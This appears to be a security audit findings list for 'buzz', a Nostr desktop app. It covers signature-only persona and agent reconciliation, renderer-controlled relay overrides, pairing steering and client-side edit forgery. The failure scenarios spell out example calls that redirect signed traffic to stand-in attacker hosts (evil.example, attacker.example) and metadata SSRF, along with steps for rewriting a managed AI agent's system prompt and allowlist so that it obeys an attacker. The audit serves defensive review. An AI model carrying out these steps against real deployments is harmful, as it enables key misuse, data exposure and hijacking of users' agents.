findings.failure_scenario: Attacker generates keypair A and signs a kind:5 event whose `a` tag is `30177:<A_pubkey_hex>:<victim_agent_pubkey_hex>`. The owner segment equals the signer, so L219 passes and `parse_deletion_coordinate` returns `(30177, victim_agent_pubkey)`. `event.verify()` at L194-196 passes because the event is genuinely signed by A. Reaching `reconcile_inbound_tombstone`, L302-305 executes `agents.retain(|record| record.pubkey != target_d_tag)`, deleting the victim's ManagedAgentRecord — which is where `private_key_nsec` and `auth_tag` live — and `save_managed_agents` commits it without the keyring cleanup that `agents.rs:1334` performs on the normal delete path, orphaning the keyring entry. The same shape with `30175:<A>:<victim_persona_d_tag>` (L292-296) or `30176:<A>:<victim_team_id>` (L297-301) destroys personas and teams. Reachable today from a compromised/XSS'd renderer invoking `reconcile_inbound_persona_event` directly; the relay-delivered path is currently blocked by the TS-only `authors:[pubkey]` filter in usePersonaSync.ts:39, which inbound.rs:187-189 itself declares to be 'no defense'.

findings.claim: `reconcile_inbound_persona_event` gates only on Schnorr signature validity, never on whether `event.pubkey` equals the local identity. A signature proves the event is authentic for whatever pubkey it carries — it does not prove the pubkey is ours. The only owner check in the whole flow is the TypeScript line `if (event.pubkey !== pubkey) return;` (usePersonaSync.ts:39), which this file's own doc comment (L187-189) declares 'is no defense'. So the security property the Rust code claims to enforce is enforced nowhere in Rust.
findings.failure_scenario: A foreign, validly signed kind:30177 whose `d` tag equals one of the victim's managed-agent pubkeys reaches `reconcile_inbound_persona_event`. `parse_verified_inbound_event` accepts it (the signature is genuine, just not the victim's), and `apply_inbound_managed_agent` (L386-404) overwrites the local record's `respond_to` and `respond_to_allowlist` — the fields that decide which pubkeys the agent will act on. Setting `respond_to_allowlist` to the attacker's pubkey converts the victim's local agent into one that takes instructions from the attacker; overwriting `system_prompt`/`model`/`provider` on a definition-less record (L395-400) rewrites what the agent does. The analogous kind:30175 path (L342-363) additionally inserts brand-new personas on no-match. Same reachability caveat as the deletion finding: exploitable from a compromised renderer today, and from a malicious relay the moment the TS filter is refactored, since nothing in Rust would notice.
findings.evidence:
event
        .verify()
        .map_err(|e| format!("inbound event failed signature verification: {e}"))?;
    Ok(event)

findings.claim: `update_profile_at_relay` takes `relay_url` verbatim from the renderer and passes it through `relay_http_base_url` — which does no scheme, host, or allowlist validation and returns any non-ws string unchanged (relay.rs:73-85) — then hands the result to `query_relay_at_with_keys` and `submit_event_at_with_keys`. Both mint a NIP-98 `kind:27235` Authorization header signed with the user's real identity key (relay.rs:354, relay/submit.rs:29) and POST it to that host. There is no confirmation, no https requirement, and no check that the URL is a workspace the user has ever configured.
findings.failure_scenario: A compromised renderer calls `update_profile_at_relay({relay_url: "http://169.254.169.254", expected_pubkey: <the real pubkey from get_identity()>, expected_avatar_url: null, avatar_url: "x"})`. `capture_expected_signer` passes because the pubkey does match the live identity. The desktop then POSTs to `http://169.254.169.254/query` with an `Authorization: Nostr <base64 kind:27235 signed by the user's identity key>` header — an authenticated SSRF from the desktop process into cloud metadata / localhost / LAN services, plus delivery of a freshly signed HttpAuth event whose `u` tag is attacker-chosen, to a host the attacker controls. On the submit leg it also publishes a signed kind:0 profile event for the user's real identity at that host. Note `query_relay_at_with_keys` is also the one relay egress path that carries no `egress_guard::assert_no_key_backup_bytes` call, unlike relay/submit.rs:28 and relay.rs:570.
findings.evidence:
let signer = capture_expected_signer(&state, &expected_pubkey)?;

    let api_base_url = relay_http_base_url(&relay_url);

findings.claim: `apply_workspace` is a plain Tauri command that accepts an arbitrary `nsec: Option<String>` from the renderer and installs the parsed keypair as the process-wide signing identity, and an arbitrary `relay_url: String` as the global relay override — with no validation beyond `Keys::parse`, no user confirmation, and no check that the pair corresponds to a workspace the user actually configured. Unlike `import_identity` (identity.rs:336-388) it takes no `identity_mutation` guard around the swap and performs no durable persistence, so the swap is silent and invisible to the identity UI.
findings.failure_scenario: A compromised renderer calls `apply_workspace({relay_url: "wss://evil.example", nsec: null, repos_dir: null})`. Every later `submit_event` and `query_relay` resolves through `relay_api_base_url_with_override` (relay.rs:50-55) to the attacker's host, so all subsequent events signed with the user's real key — and every NIP-98 Authorization header built by `build_nip98_auth_header` (relay.rs:101-109) — are delivered to the attacker, and every read the app performs returns attacker-chosen events. Alternatively, passing an attacker-generated `nsec` replaces the live signing identity in memory: subsequent user actions are signed by a key the attacker holds while `get_identity` reports the substituted pubkey as if it were the user's own, and `create_ncryptsec_backup` would encrypt and hand back the substituted key. Because nothing is persisted, the swap disappears on restart and leaves no trace.

findings.claim: The WebSocket endpoint for the nsec-carrying pairing session is taken from the main relay's own NIP-11 document field `pairing_relay_url` and accepted after only a scheme/host sanity check — no same-origin, same-host, or TLS requirement. A relay (or anyone who can tamper with the plaintext NIP-11 GET when the workspace relay is `ws://`, see probe_pairing_relay L483-489) can steer the entire pairing exchange to a third-party server, and can downgrade it from `wss` to `ws`.
findings.failure_scenario: A malicious or compromised relay serves `{"pairing_relay_url":"ws://attacker.example"}` from its NIP-11 endpoint. `pairing_relay_from_nip11` accepts it (scheme is in {ws,wss}, host is present), `resolve_pairing_relay_url` returns it verbatim (L519), and `start_pairing` builds the whole session — including the QR the phone will scan — against the attacker's server, over plaintext WebSocket. The attacker sees the pairing metadata, both ephemeral pubkeys, and the encrypted nsec payload, and can silently drop or delay messages to force retries. Payload confidentiality still holds because the NIP-44 conversation key derives from the QR secret shown on the desktop screen and buzz-core's PairingSession does verify every inbound event (session.rs:632-634), so this is traffic capture and denial-of-pairing rather than key theft — which is why I rate it low. I did not find a caller that validates the returned URL against the workspace relay's origin.

findings.claim: `update_profile` does a read-merge-write of the replaceable kind:0 profile but the merge only carries five fields forward. `build_profile` (events.rs:474-499) can only emit `display_name`, `name`, `picture`, `about`, `nip05`; every other key that was in the prior kind:0 content is silently dropped from the newly signed replacement event.
findings.failure_scenario: A user has a kind:0 with `banner`, `website`, `lud16` (a Lightning address) set from any other Nostr client — buzz reads it fine because it only picks out five keys and ignores the rest. The user then edits their About text in buzz. `update_profile` reads the prior event (line 49-57), pulls only display_name/name/picture/about/nip05 out of `current` (lines 66-78), and calls `build_profile` with exactly those five. The relay replaces the old kind:0 (buzz-db/src/lib.rs replace_addressable_event soft-deletes the prior row), so banner/website/lud16 are gone from the network with no warning and no local copy. Their Lightning address stops working everywhere.
findings.evidence: let builder = events::build_profile(dn, name, picture, ab, nip05)?;

findings.claim: `update_profile` signs the replacement kind:0 at wall-clock `now` with no monotonic floor over the prior head's `created_at`, unlike its own sibling `update_profile_at_relay`, which routes through `build_deferred_profile_event` -> `monotonic_created_at(prior)` (profile.rs:162-165). If the existing kind:0 head carries a `created_at` at or after `now`, the relay drops the new event as dominated and the command still returns `Ok` — the edit vanishes.
findings.failure_scenario: buzz's own pairing flow puts the same nsec on a second device. Device B's clock runs 5 minutes fast and publishes a profile at T+300. On device A the user changes their display name: `submit_event` (relay/submit.rs:71-78) signs at `now` = T, the relay's stale-write guard in crates/buzz-db/src/lib.rs (`let dominated = created_at < existing_ts ...` -> `return Ok((StoredEvent::..., false))`) rolls the transaction back and reports accepted, so `submit_event` sees no error. `update_profile` then re-fetches (lines 84-92) and returns the OLD profile. The UI shows the name snapping back to its previous value with no error message, and it keeps doing so for five minutes. The same happens with no second device at all: two `update_profile_at_relay` avatar saves inside one second leave the head at `now+1`, and any `update_profile` in that second is silently discarded.
findings.evidence:
let builder = events::build_profile(dn, name, picture, ab, nip05)?;
    submit_event(builder, &state).await?;

findings.claim: `get_forum_posts` hands the frontend a bare `created_at` cursor, which it feeds back as `until` on the next call. `until` without `before_id` compiles to `created_at <= u` in crates/buzz-db/src/event.rs:505-506 — inclusive — so every page re-returns its own boundary post, and a `created_at` second holding a full page of posts makes the cursor unable to advance at all. This is the exact wall that `get_channel_messages_before` in the same file documents (lines 409-423) and fixes with a `(until, before_id)` composite; the forum reader never got the fix.
findings.failure_scenario: A forum channel receives 20+ kind:45001 posts inside one second (a migration, a bulk import, or an agent burst). The user opens the forum with the default cap of 20, gets 20 posts, and clicks 'Load more'. The frontend sends `before = last.created_at`; the relay's SQL becomes `created_at <= that_second ORDER BY created_at DESC LIMIT 20` and returns the identical 20 rows. Every subsequent 'Load more' returns the same page forever — the rest of the forum's history is unreachable, and the list visibly duplicates the boundary post even in the ordinary case.
findings.evidence: let next_cursor = messages.last().map(|m| m.created_at);

findings.claim: `get_forum_thread` accepts `limit` and `cursor` and throws both away on its first line, never sets a `limit` on its reply filter (so the relay's default cap applies), and then reports `total_replies = replies.len()` — the count of whatever survived that invisible cap — while hard-coding `next_cursor: None`. The UI is handed a truncated reply set labelled as the complete one, with no way to page for the rest.
findings.failure_scenario: A forum thread accumulates more replies than the relay's default query limit. A user opens it: the second filter at lines 253-257 carries `kinds`/`#e`/`#h` and no `limit`, so the relay returns its default slice. `total_replies` (line 271) counts only that slice, so the thread header reads e.g. '50 replies' when there are 400. `next_cursor` is `None`, so the frontend has nothing to page with, and the `limit`/`cursor` arguments it did pass were discarded at line 246. Replies are permanently invisible in the UI and the visible count is wrong.
findings.evidence: let _ = (limit, cursor);

findings.claim: The marker-scan paging loop backing `send_managed_agent_channel_message`'s duplicate suppression advances its cursor to `min(created_at) - 1`, which skips every event sharing that oldest second beyond the 500-row page boundary. It is also bounded at 10 pages (5000 events). Either miss makes `find_managed_agent_channel_message_by_marker` return `None` for a marker that does exist, and the caller then posts the message again.
findings.failure_scenario: An agent posts a marked announcement into a busy channel. Later the same flow re-runs (app restart, retry, config change). `send_managed_agent_channel_message` calls the marker scan at line 816; the relay returns a full 500-event page whose oldest 40 events all share one second. The loop sets `until = that_second - 1`, jumping over the ~30 events at that second that did not fit in the page — one of which carries the marker. The scan reports 'no existing marker', the guard at lines 815-836 does not short-circuit, and a duplicate announcement is signed with the agent's key and posted to the channel. The same thing happens unconditionally in any channel with more than 5000 stream messages, since the loop stops after 10 pages.
findings.evidence:
until = events
            .iter()
            .map(|event| event.created_at.as_secs())
            .min()
            .map(|timestamp| timestamp.saturating_sub(1));

findings.claim: `show_native_notification` is an unauthenticated Tauri command that spawns one detached OS thread per invocation, and each thread blocks in `handle.wait_for_action(...)` holding an open D-Bus connection until that specific notification is dismissed or expires. There is no cap, no dedupe, and no way to reap a thread whose notification the user never dismisses.
findings.failure_scenario: On Linux, a notification that lands in the GNOME message tray without an expiry timeout stays 'open' until the user clears it. Every one holds a live thread (default 8 MiB stack reservation) plus a D-Bus connection. A user who is away while a busy channel or agent mentions them repeatedly accrues hundreds of parked threads and D-Bus connections; the session bus enforces a per-connection limit and starts refusing new ones, at which point `builder.show()` fails and notifications stop entirely (only an eprintln at line 82 records it). The same command is directly callable in a loop from the renderer, so a single `for` loop over `invoke('show_native_notification', ...)` exhausts threads and D-Bus slots with no rate limit anywhere in the path.
findings.evidence: std::thread::spawn(move || {

findings.claim: `confirm_agent_snapshot_import`'s phase-3a store block has no rollback. It commits the AgentDefinition (`save_personas`, line 475), enqueues the kind:30175 persona event for relay publication (`retain_persona_pending`, line 478), and only then writes the instance record; if `save_managed_agents` fails, the bare `?` unwinds and leaves both earlier effects committed. The sibling team importer in team_snapshot.rs:673-740 builds an explicit `rollback_agents` closure for exactly this window, so the single-agent path is the one that was missed.
findings.failure_scenario: A user imports an .agent.png while the disk is full or the store file is locked by another buzz instance. `save_personas` succeeds (it rewrites the definition half of managed-agents.json), `retain_persona_pending` writes a signed kind:30175 into the retention DB with `pending_sync = true`, then `save_managed_agents` fails on the atomic write. The command returns an error and the UI says the import failed — but the agent list now shows a ghost agent with no keypair, no managed-agent record, and no way to start it, and the background flush loop publishes that ghost's kind:30175 to the relay where other members see it. The minted nsec is dropped on the floor, so the ghost can never be repaired. Retrying the import adds another ghost each time.

findings.claim: `get_channels` swallows relay errors on both of its enrichment queries with `.unwrap_or_default()` (member counts at line 221, last-message timestamps at line 252). A transient relay failure on either query is indistinguishable from 'this data is genuinely empty': the command still returns `Ok` with every channel reporting zero members and no last-message timestamp.
findings.failure_scenario: The relay returns a 5xx (or the HTTP call times out) on the batched kind:39002 query during a channel-list refresh. `query_relay(...).await.unwrap_or_default()` yields an empty Vec, `collect_members_by_channel` produces an empty map, and the `if let Some(info)` at line 225 never fires — so `member_count` stays at whatever `channel_info_from_event` defaulted it to (0) for every channel. The same failure on the per-channel last-message filters at line 252 leaves `last_message_at` as `None` everywhere. The user sees their entire channel list report '0 members' and lose its recency ordering, with no error banner and nothing in the UI to distinguish it from a real empty workspace — the natural reaction is to think the workspace was wiped.

findings.claim: `get_note_reactions` folds NIP-09 deletions without checking who authored them: the kind:5 filter carries `#e` and no `authors`, and `deleted_event_ids` (lines 24-29) harvests every e-tag of every returned kind:5 regardless of its author. The sibling `get_liked_notes` in the same file pins `"authors": [author_pubkey]` on its deletion query (lines 288-296), so the asymmetry is clearly unintentional. The defect is that the desktop has no defence of its own: point a workspace at any relay with laxer or absent NIP-09 validation (the desktop already accepts caller-supplied relay URLs, e.g. `update_profile_at_relay`), and a single kind:5 e-tagging other people's kind:7 reaction ids makes those likes disappear from the Pulse reaction counts of every buzz desktop that renders the note. findings.claim: `reconcile_inbound_persona_event` verifies the inbound event's Schnorr signature but never checks that `event.pubkey` equals the local owner's pubkey. `apply_inbound_persona` then matches purely on the `d`-tag and overwrites `system_prompt`, `model`, `provider`, and `respond_to_allowlist` on the local persona. Any validly-signed kind:30175 from ANY author whose d-tag collides with a local persona's d-tag rewrites that persona on disk. The only owner check in the whole flow lives in TypeScript (`usePersonaSync.ts:39` — `if (event.pubkey !== pubkey) return;`), which the Rust file's own doc comment at line 188 dismisses as "no defense", yet no Rust-side equivalent was added.
findings.failure_scenario: A compromised/XSS'd renderer (the stated threat model for this slice) invokes `reconcile_inbound_persona_event(eventJson, arrivalRelayUrl)` directly, bypassing the TS filter in `usePersonaSync.ts:39`. The attacker supplies a kind:30175 event signed with the ATTACKER's own key (so `parse_verified_inbound_event` at inbound.rs:190-197 passes) carrying `["d", "<victim persona d_tag>"]` and a content blob whose `system_prompt` is attacker-chosen and whose `respond_to_allowlist` contains the attacker's pubkey. Control flows: reconcile_inbound_persona_event (inbound.rs:56) -> reconcile_inbound_persona_event_blocking (inbound.rs:68) -> parse_verified_inbound_event (inbound.rs:190, signature only) -> apply_inbound_persona (inbound.rs:342) -> save_personas. findings.claim: The NIP-09 tombstone path in the same command deletes local records by d-tag alone. `parse_deletion_coordinate` (inbound.rs:219) only checks that the coordinate's owner field matches the event's OWN pubkey — a self-consistency check any attacker satisfies by naming their own pubkey — and then `reconcile_inbound_tombstone` unconditionally removes the matching local persona (line 294), team (line 299), or managed-agent record (line 304). Nothing compares the tombstone's author to the desktop's identity, so a kind:5 signed by a stranger deletes the user's local agent/persona/team records from disk.
findings.failure_scenario: A compromised renderer calls `reconcile_inbound_persona_event` with a kind:5 event signed by an attacker key carrying tag `["a", "30177:<attacker_pubkey>:<victim_agent_pubkey>"]`. `parse_deletion_coordinate` (inbound.rs:219) accepts it because the coordinate owner equals `event.pubkey`. `reconcile_inbound_tombstone` (inbound.rs:302-306) then runs `agents.retain(|record| record.pubkey != target_d_tag)` and `save_managed_agents`, dropping the victim's `ManagedAgentRecord` — including its `auth_tag`, persona link and config — from the store. `save_managed_agents` (managed_agents/storage.rs:363-382) does not delete the corresponding keyring entry, so the agent's secret is orphaned in the OS keyring with nothing left on disk mapping it to a pubkey: the agent is unrecoverably removed from the app. Repeating with `30175:` or `30176:` coordinates wipes personas and teams the same way.

findings.claim: `apply_workspace` takes a `relay_url: String` straight from the renderer and stores it as the process-wide `relay_url_override` with no parsing, scheme check, or origin allowlist. That override is the base for `relay_api_base_url_with_override` (relay.rs:50), which is (a) the target of every `query_relay`/`submit_event` call in this slice and (b) the allowlist base that `validate_download_url` (media_download.rs:31-50) compares media URLs against. One renderer-controlled command therefore redirects all NIP-98-authenticated relay traffic AND neuters the media SSRF guard. The same command also swaps `state.keys` from a renderer-supplied `nsec` (line 176-177) without taking `state.identity_mutation`, the lock every other identity-mutating path in identity.rs (lines 229, 354, 476) takes for exactly this reason.
findings.failure_scenario: A compromised renderer calls `apply_workspace(relay_url: "https://attacker.example", nsec: null, repos_dir: null, agent_managed_profiles: null)`. `relay_http_base_url` (relay.rs:73-85) passes a non-ws:// string through unchanged, so `relay_api_base_url_with_override` now returns `https://attacker.example`. From that point: every `query_relay` (relay.rs:315-341) POSTs to `https://attacker.example/query` with an `Authorization` header minted by `build_nip98_auth_header` using the user's real signing key, and every `submit_event` delivers the user's freshly-signed events to the attacker (portable signed Nostr events the attacker can then replay onto the real workspace relay). Simultaneously `validate_download_url(url, relay_base)` (media_download.rs:48) now accepts `https://attacker.example/media/...`, so `fetch_media_bytes`, `download_file`, `download_image`, and `copy_image_to_clipboard` will fetch attacker-controlled bytes with the media auth header attached. Separately, `*keys_guard = keys` at workspace.rs:176-177 can land between `persist_current_identity`'s `identity_mutation` acquisition (identity.rs:476) and its key clone (identity.rs:486), so the keyring gets persisted with a key that is no longer the live identity.

findings.claim: `sign_nostr_identity_binding` reads the signing key with `state.keys.lock()...clone()` instead of `state.signing_keys()`. `signing_keys()` (app_state.rs:306-322) is the gate that refuses to sign while `identity_lost` or `keyring_locked` is set, and every other signing command in identity.rs (lines 115, 143, 170, 192, 232, 646, 672, 692) goes through it. In recovery mode the app boots on an EPHEMERAL throwaway key (documented at app_state.rs:355-357), so this one command will sign an identity-binding assertion with a key that is not the user's identity, at exactly the moment the gate exists to prevent that.
findings.failure_scenario: The user's OS keyring is unreachable this boot, so `resolve_persisted_identity` (app_state.rs:358-388) sets `keyring_locked` and leaves `state.keys` holding an ephemeral generated key. The user (or an XSS'd renderer) drives the web identity-binding flow: `sign_nostr_identity_binding(challenge_id, nonce, verification_code, origin, expires_at)` skips the recovery gate, signs a `kind:nostr_bind::KIND` event with the ephemeral key, and the remote service binds the throwaway pubkey to the user's account. Every other signing surface in the same file correctly returns "identity is in recovery mode; event signing is disabled" for the same session, so the failure is silent and inconsistent — the user believes they bound their real identity.

        .keys
        .lock()
        .map_err(|error| error.to_string())?
        .clone();

findings.claim: `query_relay_all` loops fetching 500-event pages until the relay returns a short page. There is no page-count cap, no total-event cap, and no check that the cursor actually advanced. `get_channels` calls it twice, once at line 147 with a filter that has no author, no `#p`, and no time bound at all (`{"kinds": [39000]}`), so the loop accumulates every channel-metadata event the relay is willing to serve into a single in-memory `Vec`. Since `query_relay` never verifies signatures (relay.rs:315-341 -> parse_json_response at relay.rs:206-231 deserializes without calling `verify()`), the relay fully controls both page contents and page length.
findings.failure_scenario: The renderer calls `get_channels` (channels.rs:79 — invoked on every app load and channel-list refresh). A hostile or compromised relay answers each `POST /query` with exactly 500 synthetic kind:39000 events and ignores the `until`/`before_id` cursor that `advance_directory_cursor` (channels.rs:35-40) writes back into the filter. Because `done` is only ever true when `page.len() < DIRECTORY_PAGE_SIZE`, the loop at channels.rs:53-64 never terminates: `all.extend(page)` grows unboundedly until the desktop process is OOM-killed. Even a merely large honest relay makes this an unbounded client-side download, since the line-147 filter selects every kind:39000 on the relay rather than the user's channels.

findings.claim: `update_profile` does a read-merge-write of the user's kind:0: it takes the relay's response, parses `ev.content` as JSON, and folds `name`, `picture`, `about`, and `nip05` from it into the profile it then signs and publishes. `query_relay` performs no signature or author verification (relay.rs:340 -> parse_json_response, relay.rs:227-230, which just calls `response.json()`), so the `authors: [my_pubkey]` filter is only advisory — a relay that ignores it hands the client an event it did not author, and the client bakes that event's fields into its own signed profile.
findings.failure_scenario: The user changes only their avatar via `update_profile(avatar_url: Some(...))`. A hostile or compromised relay answers the prior-profile query at profile.rs:49-57 with a kind:0 event it fabricated, whose content sets `nip05` to an impersonation handle and `about` to attacker text. Because `display_name`, `name`, `about`, and `nip05` are all `None` in this call, lines 66-78 fall through to the relay-supplied `current` values, `events::build_profile` at line 80 assembles them, and `submit_event` (line 81) signs and publishes the result under the user's real key. The user has now cryptographically attested to attacker-chosen profile metadata without ever seeing it. The same absence of verification means the returned `ProfileInfo` at lines 94-98 is also unauthenticated.

findings.claim: `resolve_thread_ref` fetches the parent event from the relay and walks its `e` tags to pick the thread root, with no `verify()` on the returned event and no check that the returned event's id actually equals `parent_event_id`. The extracted root is then embedded in the event the user signs via `events::build_message` / `build_forum_comment` and submitted (messages.rs:565-597). A relay that returns a fabricated or substituted parent therefore chooses the `e`-root tag inside the user's own signed message.
findings.failure_scenario: The user replies in a channel: `send_channel_message(channel_id, content, parent_event_id: Some(pid), ...)` -> `resolve_thread_ref(pid, &state)` (messages.rs:565 or 579). The relay answers the `ids: [pid]` query (messages.rs:488-496) with an event it fabricated carrying `["e", "<attacker chosen root>", "", "root"]`. Lines 504-513 read `s[1]` as the root, line 518 parses it, and the resulting `ThreadRef` is handed to `events::build_message` (messages.rs:585) whose output is signed and published by `submit_event` (messages.rs:597). The user's reply is now cryptographically bound to a thread they never participated in — usable to make a user's words appear as a reply under an attacker-chosen root. Note the code does not even check `evs.first().id == parent_event_id`, so no id substitution is needed.

findings.claim: `get_presence` resolves the subject of a kind:20001 presence event from its `p` tag when present, falling back to the event author only if no `p` tag exists. The relay-side `authors` filter constrains who may author the events, but nothing constrains what a `p` tag may name, and `query_relay` performs no signature verification. So any pubkey in the caller-supplied `pubkeys` set can dictate the presence status shown for any other pubkey in that set.
findings.failure_scenario: The UI calls `get_presence(pubkeys: [alice, mallory, ...])` to populate a member list. Mallory publishes a kind:20001 event authored by herself with tags `[["p", "<alice hex>"]]` and content `"offline"`. The relay returns it (it matches `authors`), and lines 363-374 assign `pk = alice` rather than `mallory`. Alice is then rendered as offline (or online, if Mallory prefers) in every client that calls this command. Impact is limited to presence-state spoofing, not access control, hence low severity — but it is a concrete case of a relay-supplied tag overriding the one field the relay filter actually authenticated.

findings.claim: reader_authorized_for_event() fails open for the two cleartext, relay-signed, globally-stored P_GATED kinds it does NOT name - member-added (44100) and member-removed (44101) notifications - so the kindless {ids:[X]} read path leaks private channel-membership metadata despite the #p read-gate. Confirms and narrows the breadth pass filter.rs:23 item: caller event_visible_to_reader (buzz-relay handlers/req.rs:1245) relies on this function as its sole per-event backstop, and p_gated_filters_authorized (req.rs:1077) deliberately exempts kindless ids lookups for every kind except KIND_DM_VISIBILITY/KIND_AGENT_TURN_METRIC. Root cause: RESULT_GATED_KINDS (kind.rs:129), hardcoded here, is a strict subset of P_GATED_KINDS (kind.rs:146).
findings.failure_scenario: An authenticated community member who learns the 32-byte event id of a kind:44100/44101 notification sends REQ {ids:[<id>]}. p_gated_filters_authorized returns true (ids exemption, kind not named). Historical delivery calls event_visible_to_reader -> reader_authorized_for_event; because kind==44100 is neither KIND_DM_VISIBILITY nor KIND_AGENT_TURN_METRIC, line 25 returns true. The relay delivers the cleartext event built at side_effects.rs:934 (content type=member_added, channel_id uuid, actor hex; p-tag=target; h-tag=channel uuid), revealing that pubkey P was added/removed from a possibly-private channel C by actor A, to a reader who is not the #p target.

findings.claim: decrypt_observer_payload() (and decrypt_agent_turn_metric wrapping it, agent_turn_metric.rs:189) NIP-44-decrypts keyed on the attacker-controllable event.pubkey with no event.verify()/verify_signature() call, unlike buzz-core's own pairing/session.rs validate_event_basics (session.rs:633). Overlaps the breadth pass observer.rs:84 item; adds that the same no-verify pattern is inherited by the agent-turn-metric read path.
findings.failure_scenario: If a caller in buzz-acp or a metrics consumer passes an event straight off the wire from an untrusted relay into decrypt_observer_payload/decrypt_agent_turn_metric before verify_event(), decryption uses an unverified (pubkey, content) pair. NIP-44 AEAD prevents forging a decryptable frame without the sender key, so exploitation needs a caller that both skips verify AND trusts event.pubkey as the frame author without checking it equals the known owner/agent; the buzz-acp caller was not confirmed to do both, hence low confidence.

findings.claim: The desktop resolves a kind:40003 edit's target using the LAST valid `e` tag (getReactionTargetId at formatTimelineMessages.ts:118-131 iterates `for (let index = tags.length - 1; index >= 0; index -= 1)`), while the relay authorises the same event against the FIRST valid `e` tag (crates/buzz-relay/src/handlers/ingest.rs:790-806, `event.tags.iter().find_map(...)` inside validate_edit_ownership). Nothing constrains the number of `e` tags on kind:40003 — the e-tag cardinality check at ingest.rs:2331-2343 applies only to KIND_DELETION/KIND_NIP29_DELETE_EVENT — so a two-`e`-tag edit is authorised against one message and applied to a different one. The result is that any channel member can overwrite the rendered body (and, via applyEditTagOverlay at line 472, the imeta attachments) of another member's message, which still renders under the victim's name and avatar.

findings.claim: getThreadReference picks the FIRST `e` tag marked "root" (`eventTags.find(...)`) but the LAST `e` tag marked "reply" (line 37, `[...eventTags].reverse().find(...)`). The relay's resolve_nip10_thread_meta (crates/buzz-relay/src/handlers/ingest.rs:595-607) assigns `root_hex` and `reply_hex` in a forward loop that overwrites on every match, so BOTH end up as the last-marked tag, and the ancestry check at ingest.rs:672-674 / 700-702 (`if client_root_bytes != parent_root { return Err("root tag does not match thread ancestry") }`) validates only that last root tag. The two sides therefore agree on `reply` but disagree on `root`, so a reply can carry a truthful trailing root tag that satisfies the relay and a forged leading root tag that the desktop uses for thread grouping.
findings.failure_scenario: Mallory posts a reply in #general with tags `[["h", channelId], ["e", VICTIM_THREAD_ROOT_ID, "", "root"], ["e", REAL_ROOT_ID, "", "root"], ["e", REAL_PARENT_ID, "", "reply"]]`. The relay's loop at ingest.rs:595-607 keeps the last root (REAL_ROOT_ID) and the last reply (REAL_PARENT_ID), so `client_root_bytes == parent_root` and the event is accepted and indexed under the real thread. Every desktop client then calls getThreadReference, which returns `rootId = VICTIM_THREAD_ROOT_ID` (first root tag) with `parentId = REAL_PARENT_ID`. Because subtree membership and unread tallies are keyed on `rootId` (features/channels/lib/threadBadgeCounts.ts:11-16 states "Subtree membership is keyed on each reply's rootId") and the read-state contexts are `thread:<rootId>` (features/channels/readState/readStateManager.ts THREAD_PREFIX), the reply is counted into — and, in thread views built from rootId, displayed inside — a thread it does not belong to. Pointing the first root tag at a non-existent 64-hex id instead makes the reply's thread context unreachable and drives useLoadMissingAncestors to issue relay fetches for an id that will never resolve.

findings.claim: The edit-overlay map is built with no check that the kind:40003 event's signer is the author (or the agent-owner) of the message it targets: the loop at lines 231-252 filters only on `event.kind === KIND_STREAM_MESSAGE_EDIT` and on the target not being deleted, then unconditionally records the edit's content and tags. The client is likewise indifferent to who signed the kind:5/kind:9005 events whose `e` tags populate `deletedEventIds` (lines 207-220). All authorship enforcement lives in the relay (validate_edit_ownership, ingest.rs:785-880), so any event stream that has not passed through that specific validator — a self-hosted or compromised community relay, a mesh/federated peer, or a replayed archive — can rewrite arbitrary users' message bodies and attachments in the timeline. This is the root cause that makes the tag-ordering differential in finding 1 exploitable rather than merely inconsistent.
findings.failure_scenario: A user joins a community hosted on a relay they do not control (Buzz is explicitly multi-tenant/self-hostable). The relay operator injects a kind:40003 event signed by any key, with a single `e` tag pointing at a message authored by a well-known member, and content of their choosing. formatTimelineMessages records it at line 245-251 with no signer check and renders it at line 460 as `body: edit.content` under the original author's pubkey, display name, avatar and role badge, with only the generic "edited" marker to distinguish it. The same operator can make any message vanish from every client's timeline by emitting a kind:5 with that message's `e` tag, since getDeletionTargets (lines 65-75) accepts any signer. Note this is defence-in-depth relative to a well-behaved relay, which does enforce ownership; the client currently has no independent check of its own.

findings.claim: The kindless-`ids` read exemption is only revoked for the two kinds in `RESULT_GATED_KINDS`, but `P_GATED_KINDS` (buzz-core/src/kind.rs:146) lists six. A kindless `{ids:[…]}` REQ therefore passes both the filter-layer `#p` gate here AND the per-event gate (`reader_authorized_for_event`, buzz-core/src/filter.rs:25, which returns `true` for every kind except 30622 and 44200), so kinds 44100, 44101 and 1059 are delivered to any authenticated reader who knows the event id — even though the comment directly above this line says the exemption is 'only safe for kinds whose id is author-bound or whose content is encrypted'.
findings.failure_scenario: Member M of a community learns the 32-byte id of a kind:44100 member-added notification addressed to another user V (e.g. from an earlier session in which M was still a member of that channel, from a log, or from a client cache). M authenticates and sends `["REQ","x",{"ids":["<id>"]}]`.
